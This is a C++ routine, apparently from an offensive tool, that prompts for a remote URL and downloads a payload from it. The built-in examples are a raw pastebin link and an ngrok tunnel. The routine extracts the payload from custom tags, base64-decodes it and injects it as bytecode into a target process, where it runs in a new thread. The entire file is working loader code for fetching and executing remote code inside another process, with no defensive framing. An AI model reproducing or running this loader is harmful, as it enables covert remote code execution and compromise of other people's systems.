void Main_InjectBytcodeWeb() {
	printf("################################# EXAMPLES #################################\n");
	printf("# Address : https://pastebin.com/raw/xf9Trt0d                              #\n");
	printf("# Port    : 443                                                            #\n");
	printf("# Element : <invoker>payload</invoker>                                     #\n");
	printf("#--------------------------------------------------------------------------#\n");
	printf("# Address : http://08ab992ff989.ngrok.io:80/payload.txt                    #\n");
	printf("################################### NOTE ###################################\n");
	printf("# By default, an HTTP GET request will be sent.                            #\n");
	printf("#--------------------------------------------------------------------------#\n");
	printf("# Payload must be enclosed from both front and back.                       #\n");
	printf("# Custom element must be unique within the web content.                    #\n");
	printf("#--------------------------------------------------------------------------#\n");
	printf("# Bytecode will run in a new thread.                                       #\n");
	printf("############################################################################\n");
	printf("\n");
	url info = ParseURL(Input("Enter address"));
	printf("\n");
	DWORD port = 0;
	if (info.port.length() < 1) {
		info.port = Input("Enter port number");
		printf("\n");
	}
	std::string element = Input("Enter custom element (optional)");
	printf("\n");
	if (info.host.length() < 1 || info.port.length() < 1) {
		printf("Required parameters are missing\n");
	}
	else if (!IsPositiveNumber(info.port)) {
		printf("Port number must be a positive number\n");
	}
	else if (!StrToDWORD(info.port, &port)) {
		printf("Failed to convert port number to DWORD\n");
	}
	else if (info.schema.length() > 0 && info.schema != "http" && info.schema != "https") {
		printf("Protocol must be either HTTP or HTTPS\n");
	}
	else {
		std::string payload = GetWebContent(info.host, port, info.pathFull, info.schema == "https");
		if (payload.length() > 0) {
			if (element.length() > 0) {
				payload = ExtractPayload(payload, element);
			}
			else {
				printf("Payload has been downloaded successfully\n");
			}
			if (payload.length() > 0) {
				printf("\n");
				DWORD pid = 0;
				if (GetProcessID(&pid)) {
					printf("\n");
					// NOTE: Change or omit the payload decoder here.
					payload = base64_decode(payload);
					InjectBytecode(pid, payload);
				}
			}
		}
	}
}

